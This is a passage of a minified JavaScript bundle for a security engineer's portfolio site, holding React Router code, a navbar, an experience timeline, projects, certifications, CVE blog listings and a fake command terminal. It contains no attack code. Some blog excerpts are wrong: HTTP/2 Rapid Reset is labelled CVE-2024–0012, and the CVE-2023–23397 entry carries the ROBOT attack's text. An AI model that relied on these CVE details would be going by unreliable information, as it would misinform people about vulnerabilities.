o=e,s=(i=t)==null?void 0:i.errors;if(s!=null){let m=o.findIndex(h=>h.route.id&&(s==null?void 0:s[h.route.id])!==void 0);m>=0||K(!1),o=o.slice(0,Math.min(o.length,m+1))}let a=!1,d=-1;if(t&&r&&r.v7_partialHydration)for(let m=0;m<o.length;m++){let h=o[m];if((h.route.HydrateFallback||h.route.hydrateFallbackElement)&&(d=m),h.route.id){let{loaderData:g,errors:k}=t,w=h.route.loader&&g[h.route.id]===void 0&&(!k||k[h.route.id]===void 0);if(h.route.lazy||w){a=!0,d>=0?o=o.slice(0,d+1):o=[o[0]];break}}}return o.reduceRight((m,h,g)=>{let k,w=!1,x=null,C=null;t&&(k=s&&h.route.id?s[h.route.id]:void 0,x=h.route.errorElement||uh,a&&(d<0&&g===0?(yh("route-fallback"),w=!0,C=null):d===g&&(w=!0,C=h.route.hydrateFallbackElement||null)));let p=n.concat(o.slice(0,g+1)),c=()=>{let f;return k?f=x:w?f=C:h.route.Component?f=b.createElement(h.route.Component,null):h.route.element?f=h.route.element:f=m,b.createElement(dh,{match:h,routeContext:{outlet:m,matches:p,isDataRoute:t!=null},children:f})};return t&&(h.route.ErrorBoundary||h.route.errorElement||g===0)?b.createElement(ch,{location:t.location,revalidation:t.revalidation,component:x,error:k,children:c(),routeContext:{outlet:null,matches:p,isDataRoute:!0}}):c()},null)}var $c=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}($c||{}),Gc=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Gc||{});function ph(e){let n=b.useContext(es);return n||K(!1),n}function hh(e){let n=b.useContext(th);return n||K(!1),n}function mh(e){let n=b.useContext(Sn);return n||K(!1),n}function Qc(e){let n=mh(),t=n.matches[n.matches.length-1];return t.route.id||K(!1),t.route.id}function gh(){var e;let n=b.useContext(Hc),t=hh(),r=Qc();return n!==void 0?n:(e=t.errors)==null?void 0:e[r]}function vh(){let{router:e}=ph($c.UseNavigateStable),n=Qc(Gc.UseNavigateStable),t=b.useRef(!1);return Vc(()=>{t.current=!0}),b.useCallback(function(i,l){l===void 0&&(l={}),t.current&&(typeof i=="number"?e.navigate(i):e.navigate(i,ir({fromRouteId:n},l)))},[e,n])}const va={};function yh(e,n,t){va[e]||(va[e]=!0)}function wh(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function Pn(e){K(!1)}function kh(e){let{basename:n="/",children:t=null,location:r,navigationType:i=sn.Pop,navigator:l,static:o=!1,future:s}=e;dr()&&K(!1);let a=n.replace(/^\/*/,"/"),d=b.useMemo(()=>({basename:a,navigator:l,static:o,future:ir({v7_relativeSplatPath:!1},s)}),[a,s,l,o]);typeof r=="string"&&(r=vt(r));let{pathname:m="/",search:h="",hash:g="",state:k=null,key:w="default"}=r,x=b.useMemo(()=>{let C=Zo(m,a);return C==null?null:{location:{pathname:C,search:h,hash:g,state:k,key:w},navigationType:i}},[a,m,h,g,k,w,i]);return x==null?null:b.createElement(Fn.Provider,{value:d},b.createElement(ji.Provider,{children:t,value:x}))}function xh(e){let{children:n,location:t}=e;return oh(no(n),t)}new Promise(()=>{});function no(e,n){n===void 0&&(n=[]);let t=[];return b.Children.forEach(e,(r,i)=>{if(!b.isValidElement(r))return;let l=[...n,i];if(r.type===b.Fragment){t.push.apply(t,no(r.props.children,l));return}r.type!==Pn&&K(!1),!r.props.index||!r.props.children||K(!1);let o={id:r.props.id||l.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=no(r.props.children,l)),t.push(o)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function to(){return to=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r])}return e},to.apply(this,arguments)}function Sh(e,n){if(e==null)return{};var t={},r=Object.keys(e),i,l;for(l=0;l<r.length;l++)i=r[l],!(n.indexOf(i)>=0)&&(t[i]=e[i]);return t}function bh(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Eh(e,n){return e.button===0&&(!n||n==="_self")&&!bh(e)}const Ch=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],Th="6";try{window.__reactRouterVersion=Th}catch{}const _h="startTransition",ya=gd[_h];function Ph(e){let{basename:n,children:t,future:r,window:i}=e,l=b.useRef();l.current==null&&(l.current=Np({window:i,v5Compat:!0}));let o=l.current,[s,a]=b.useState({action:o.action,location:o.location}),{v7_startTransition:d}=r||{},m=b.useCallback(h=>{d&&ya?ya(()=>a(h)):a(h)},[a,d]);return b.useLayoutEffect(()=>o.listen(m),[o,m]),b.useEffect(()=>wh(r),[r]),b.createElement(kh,{basename:n,children:t,location:s.location,navigationType:s.action,navigator:o,future:r})}const Nh=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Lh=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Qe=b.forwardRef(function(n,t){let{onClick:r,relative:i,reloadDocument:l,replace:o,state:s,target:a,to:d,preventScrollReset:m,viewTransition:h}=n,g=Sh(n,Ch),{basename:k}=b.useContext(Fn),w,x=!1;if(typeof d=="string"&&Lh.test(d)&&(w=d,Nh))try{let f=new URL(window.location.href),v=d.startsWith("//")?new URL(f.protocol+d):new URL(d),y=Zo(v.pathname,k);v.origin===f.origin&&y!=null?d=y+v.search+v.hash:x=!0}catch{}let C=rh(d,{relative:i}),p=jh(d,{replace:o,state:s,target:a,preventScrollReset:m,relative:i,viewTransition:h});function c(f){r&&r(f),f.defaultPrevented||p(f)}return b.createElement("a",to({},g,{href:w||C,onClick:x||l?r:c,ref:t,target:a}))});var wa;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(wa||(wa={}));var ka;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(ka||(ka={}));function jh(e,n){let{target:t,replace:r,state:i,preventScrollReset:l,relative:o,viewTransition:s}=n===void 0?{}:n,a=ns(),d=fr(),m=Wc(e,{relative:o});return b.useCallback(h=>{if(Eh(h,t)){h.preventDefault();let g=r!==void 0?r:hi(d)===hi(m);a(e,{replace:g,state:i,preventScrollReset:l,relative:o,viewTransition:s})}},[d,a,m,r,i,t,e,l,o,s])}function Oh({onToggleTheme:e,theme:n}){const t=fr(),r=ns(),i=t.pathname==="/blogs",l=t.pathname.startsWith("/projects"),o=t.pathname.startsWith("/certifications"),s=t.hash==="#contact"||t.pathname==="/contact",a=(d,m)=>{d.preventDefault();const h=()=>{const g=document.getElementById(m);g&&g.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(r("/"),setTimeout(h,80)):h()};return u.jsx("nav",{className:"navbar",children:u.jsxs("div",{className:"container nav-container",children:[u.jsx("div",{className:"logo",children:"Hem Parekh"}),u.jsxs("ul",{className:"nav-links",children:[u.jsx("li",{children:u.jsx("a",{href:"#about",onClick:d=>a(d,"about"),children:"About"})}),u.jsx("li",{children:u.jsx("a",{href:"#experience",onClick:d=>a(d,"experience"),children:"Experience"})}),u.jsx("li",{children:u.jsx(Qe,{to:"/projects",className:l?"active":"",children:"Projects"})}),u.jsx("li",{children:u.jsx(Qe,{to:"/certifications",className:o?"active":"",children:"Certs"})}),u.jsx("li",{children:u.jsx("a",{href:"https://drive.google.com/file/d/18iXELe1Bge8-SSpKBscATGjY4rCicmNb/view?usp=sharing",target:"_blank",rel:"noreferrer",children:"Resume"})}),u.jsx("li",{children:u.jsx(Qe,{to:"/blogs",className:i?"active":"",children:"Blog"})}),u.jsx("li",{children:u.jsx("a",{href:"#contact",className:s?"active":"",onClick:d=>a(d,"contact"),children:"Contact"})})]}),u.jsx("button",{className:"theme-toggle",id:"themeToggle",onClick:e,children:n==="dark"?"Light Mode":"Dark Mode"})]})})}function Rh(){return u.jsx("footer",{className:"footer",children:u.jsx("div",{className:"container",children:u.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Ah({data:e}){return u.jsx("header",{className:"hero",id:"home",children:u.jsxs("div",{className:"hero-content container",children:[u.jsxs("h1",{children:["Hello, I'm ",u.jsx("span",{className:"highlight",children:e.highlight}),"."]}),u.jsxs("div",{className:"hero-descriptors",children:[u.jsx("span",{className:"pill",children:"Security Engineer"}),u.jsx("span",{className:"pill",children:"Pen Tester"})]}),u.jsx("img",{src:e.image,className:"heading-image",alt:"Heading"}),u.jsx("p",{children:e.blurb}),u.jsxs("div",{className:"hero-ctas",children:[u.jsx(Qe,{className:"button primary",to:"/projects",children:"View Projects"}),u.jsx(Qe,{className:"button ghost",to:"/certifications",children:"View Certifications"})]}),u.jsx("div",{className:"scroll-down-arrow",children:u.jsx("a",{href:"#about",className:"arrow-link",children:u.jsx("span",{children:"↓"})})})]})})}function Mh({links:e=[]}){return u.jsx("div",{className:"social-icons",children:e.map(n=>u.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer","aria-label":n.label||"Social link",children:u.jsx("i",{className:n.icon})},n.href))})}function Ih({data:e,socials:n}){return u.jsx("section",{className:"about",id:"about",children:u.jsxs("div",{className:"container about-container",children:[u.jsx("div",{className:"about-photo",children:u.jsx("img",{src:e.image,alt:"Hem Parekh",style:{maxWidth:"100%",borderRadius:"10px"}})}),u.jsxs("div",{className:"about-content",children:[u.jsx("h2",{children:e.title}),u.jsx("p",{children:e.text}),u.jsx(Mh,{links:n})]})]})})}function Dh({items:e}){return u.jsx("section",{className:"experience",id:"experience",children:u.jsxs("div",{className:"container",children:[u.jsx("div",{className:"section-header",children:u.jsx("div",{children:u.jsx("h2",{children:"EXPERIENCE"})})}),u.jsx("div",{className:"timeline-container",children:u.jsx("div",{className:"timeline",children:e.map(n=>u.jsxs("div",{className:"timeline-item",children:[u.jsx("div",{className:"year",children:n.range}),u.jsxs("div",{className:"content",children:[u.jsx("h3",{children:n.role}),u.jsx("h4",{children:n.org}),u.jsx("p",{children:n.desc})]})]},`${n.range}-${n.role}`))})})]})})}const Kc=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],zh={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"I’m a Security Engineer & Pen Tester, enthusiastic about building robust software and hunting vulnerabilities."},Bh={title:"ABOUT ME",image:"/images/profile.jpeg",text:`I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building robust software 
        and unearthing vulnerabilities. I blend engineering expertise with a hacker’s curiosity to design 
        secure solutions. Outside of code and exploits, I enjoy blogging about my discoveries and advocating 
        for a safer digital world.`},Yc=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Xc=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],qc=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],Uh={title:"Hi there 👋, welcome to my Blog",subtitle:"This is where I talk about my projects and everything that I find interesting in Cybersecurity.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},lr=[{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}],xa=["help                          show commands","projects                      list projects","open <project-slug>           go to Projects and highlight target","blogs                         list blogs","read <blog-slug>              open blog post","certs [--issuer=AWS]          list certifications (optional issuer/domain filter)","experience                    show mission log","contact                       contact details","goto <home|projects|certs|blogs>  navigate to a page","clear                         clear the terminal"];function Fe(e){return e.toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/^-+|-+$/g,"")}function Fh(){const e=ns(),n=b.useRef(null),t=b.useRef(null),[r,i]=b.useState([{cmd:"help",type:"help",payload:xa}]),[l,o]=b.useState(["help"]),[s,a]=b.useState(null),[d,m]=b.useState(""),h=b.useMemo(()=>Xc.map(c=>({...c,slug:Fe(c.title)})),[]),g=b.useMemo(()=>lr.map(c=>({...c,slug:Fe(c.slug||c.title)})),[]),k=b.useMemo(()=>qc.map(c=>({...c,slug:Fe(c.title)})),[]);b.useEffect(()=>{t.current&&t.current.scrollIntoView({behavior:"smooth"})},[r]),b.useEffect(()=>{const c=f=>{var v;f.key==="/"&&document.activeElement!==n.current&&(f.preventDefault(),(v=n.current)==null||v.focus()),f.key==="?"&&document.activeElement!==n.current&&(f.preventDefault(),x("help"))};return window.addEventListener("keydown",c),()=>window.removeEventListener("keydown",c)});const w=(c,f,v)=>{i(y=>[...y,{cmd:c,type:f,payload:v}]),o(y=>[...y,c]),a(null)},x=c=>{const f=c.trim();if(!f)return;const[v,...y]=f.split(" "),T=y.join(" ").trim();if(v==="help"||v==="?"){w(f,"help",xa);return}if(v==="clear"){i([]),o([]),a(null);return}if(v==="projects"){w(f,"projects",h);return}if(v==="open"){const E=h.find(N=>N.slug===Fe(T));E?(w(f,"info",`Opening project: ${E.title}`),e("/projects",{state:{highlight:E.slug}})):w(f,"error","Project not found. Use `projects` to view slugs.");return}if(v==="blogs"){w(f,"blogs",g);return}if(v==="read"){const E=lr.find(N=>Fe(N.slug||N.title)===Fe(T));E?(w(f,"info",`Opening blog: ${E.title}`),e(E.href)):w(f,"error","Blog not found. Use `blogs` to view slugs.");return}if(v==="certs"){const E=T.match(/--issuer=([a-z0-9-]+)/i),N=T.match(/--domain=([a-z0-9-]+)/i),U=k.filter(j=>{const ge=E?Fe(j.issuer).includes(E[1].toLowerCase()):!0,bn=N?Fe(j.domain).includes(N[1].toLowerCase()):!0;return ge&&bn});w(f,"certs",U);return}if(v==="experience"){w(f,"experience",Yc);return}if(v==="contact"){w(f,"contact",Kc);return}if(v==="goto"){if(["home","projects","certs","blogs","certifications"].includes(T)){const E=T==="home"?"/":T==="projects"?"/projects":T.startsWith("cert")?"/certifications":"/blogs";w(f,"info",`Navigating to ${E}`),e(E)}else w(f,"error","Unknown destination. Use home, projects, certs, blogs.");return}w(f,"error","Unknown command. Type `help` for options.")},C=c=>{if(c.key==="Enter")c.preventDefault(),x(d),m("");else if(c.key==="ArrowUp"){if(c.preventDefault(),!l.length)return;const f=s===null?l.length-1:Math.max(0,s-1);a(f),m(l[f]||"")}else if(c.key==="ArrowDown"){if(c.preventDefault(),s===null)return;const f=s+1;f>=l.length?(a(null),m("")):(a(f),m(l[f]||""))}},p=c=>{const{type:f,payload:v}=c;return f==="help"&&Array.isArray(v)?u.jsx("ul",{className:"terminal-list",children:v.map(y=>u.jsx("li",{children:y},y))}):f==="projects"?u.jsx("div",{className:"terminal-table",children:v.map(y=>{var T;return u.jsxs("div",{className:"terminal-row",children:[u.jsxs("div",{children:[u.jsx("span",{className:"terminal-strong",children:y.title}),u.jsxs("span",{className:"terminal-dim",children:[" (",y.slug,")"]})]}),u.jsx("div",{className:"terminal-dim",children:y.description}),u.jsx("div",{className:"terminal-tags",children:(T=y.tags)==null?void 0:T.map(E=>u.jsx("span",{className:"terminal-tag",children:E},E))}),u.jsxs("div",{className:"terminal-actions",children:[u.jsx("button",{onClick:()=>e("/projects"),children:"open"}),y.href&&u.jsx("a",{href:y.href,target:"_blank",rel:"noreferrer",children:"repo"})]})]},y.slug)})}):f==="blogs"?u.jsx("div",{className:"terminal-table",children:v.map(y=>u.jsxs("div",{className:"terminal-row",children:[u.jsxs("div",{children:[u.jsx("span",{className:"terminal-strong",children:y.title}),u.jsxs("span",{className:"terminal-dim",children:[" (",Fe(y.slug),")"]})]}),u.jsxs("div",{className:"terminal-dim",children:[y.date," · ",y.readTime]}),u.jsx("div",{className:"terminal-actions",children:u.jsx("button",{onClick:()=>e(y.href),children:"read"})})]},y.slug))}):f==="certs"?v.length?u.jsx("div",{className:"terminal-table",children:v.map(y=>u.jsxs("div",{className:"terminal-row",children:[u.jsx("div",{className:"terminal-strong",children:y.title}),u.jsx("div",{className:"terminal-dim",children:y.details}),u.jsxs("div",{className:"terminal-tags",children:[u.jsx("span",{className:"terminal-tag",children:y.domain}),u.jsx("span",{className:"terminal-tag",children:y.issuer})]}),u.jsx("div",{className:"terminal-actions",children:u.jsx("a",{href:y.href,target:"_blank",rel:"noreferrer",children:"verify"})})]},y.slug))}):u.jsx("div",{className:"terminal-dim",children:"No certs match filters."}):f==="experience"?u.jsx("div",{className:"terminal-table",children:v.map(y=>u.jsxs("div",{className:"terminal-row",children:[u.jsxs("div",{className:"terminal-strong",children:[y.role," @ ",y.org]}),u.jsx("div",{className:"terminal-dim",children:y.range}),u.jsx("div",{className:"terminal-dim",children:y.desc})]},`${y.org}-${y.range}`))}):f==="contact"?u.jsxs("div",{className:"terminal-table",children:[u.jsxs("div",{className:"terminal-row",children:[u.jsx("div",{className:"terminal-strong",children:"Email"}),u.jsx("div",{className:"terminal-actions",children:u.jsx("a",{href:"mailto:hemparekh1596@gmail.com",children:"send mail"})})]}),v.map(y=>u.jsxs("div",{className:"terminal-row",children:[u.jsx("div",{className:"terminal-strong",children:y.label}),u.jsx("div",{className:"terminal-actions",children:u.jsx("a",{href:y.href,target:"_blank",rel:"noreferrer",children:"open"})})]},y.href))]}):f==="info"?u.jsx("div",{className:"terminal-dim",children:v}):f==="error"?u.jsx("div",{className:"terminal-error",children:v}):null};return u.jsxs("section",{className:"terminal-shell container",children:[u.jsxs("div",{className:"terminal-header",children:[u.jsx("span",{className:"dot red"}),u.jsx("span",{className:"dot yellow"}),u.jsx("span",{className:"dot green"}),u.jsx("span",{className:"terminal-title",children:"hem@portfolio:~"}),u.jsx("span",{className:"terminal-shortcut",children:"Press / to focus, ? for help"})]}),u.jsxs("div",{className:"terminal-body",children:[r.map((c,f)=>u.jsxs("div",{className:"terminal-block",children:[u.jsxs("div",{className:"terminal-line",children:[u.jsx("span",{className:"prompt",children:"❯"}),u.jsx("span",{className:"command",children:c.cmd})]}),u.jsx("div",{className:"terminal-output",children:p(c)})]},`${c.cmd}-${f}`)),u.jsx("div",{ref:t})]}),u.jsxs("div",{className:"terminal-input",children:[u.jsx("span",{className:"prompt",children:"❯"}),u.jsx("input",{ref:n,"aria-label":"Terminal command input",value:d,onChange:c=>m(c.target.value),onKeyDown:C,placeholder:"Type a command, e.g., projects, blogs, certs --issuer=AWS, read firmware_llm_annotator"})]})]})}function Sa(){return u.jsxs(u.Fragment,{children:[u.jsx(Fh,{}),u.jsx(Ah,{data:zh}),u.jsx(Ih,{data:Bh,socials:Kc}),u.jsx(Dh,{items:Yc})]})}function Hh({data:e}){return u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsxs("h1",{children:["Hi there ",u.jsx("span",{className:"wave",children:"👋"}),", welcome to my Blog"]}),u.jsx("p",{className:"blog-subtitle",children:e.subtitle})]})})}function Vh({posts:e}){return u.jsx("section",{className:"blog-list-section",children:u.jsx("div",{className:"container text-center",children:e.map(n=>u.jsxs("article",{className:"blog-card",children:[u.jsx(Qe,{to:n.href,children:u.jsx("h2",{className:"blog-title",children:n.title})}),u.jsx("p",{className:"blog-excerpt",children:n.excerpt}),u.jsxs("p",{className:"blog-meta",children:[u.jsx("span",{children:n.date})," · ",u.jsx("span",{children:n.readTime})]}),u.jsx("div",{className:"blog-tags",children:u.jsx("span",{className:"pill",children:"Security"})})]},n.title))})})}function Wh({posts:e,onFilter:n}){const[t,r]=b.useState(""),i=b.useMemo(()=>t.trim()?e.filter(o=>o.title.toLowerCase().includes(t.toLowerCase())||o.excerpt.toLowerCase().includes(t.toLowerCase())):e,[t,e]),l=o=>{r(o.target.value),n(i)};return u.jsx("div",{className:"blog-search",children:u.jsx("input",{type:"search",value:t,onChange:l,placeholder:"Search posts...",className:"search-input"})})}function $h(){const[e,n]=b.useState(lr);return 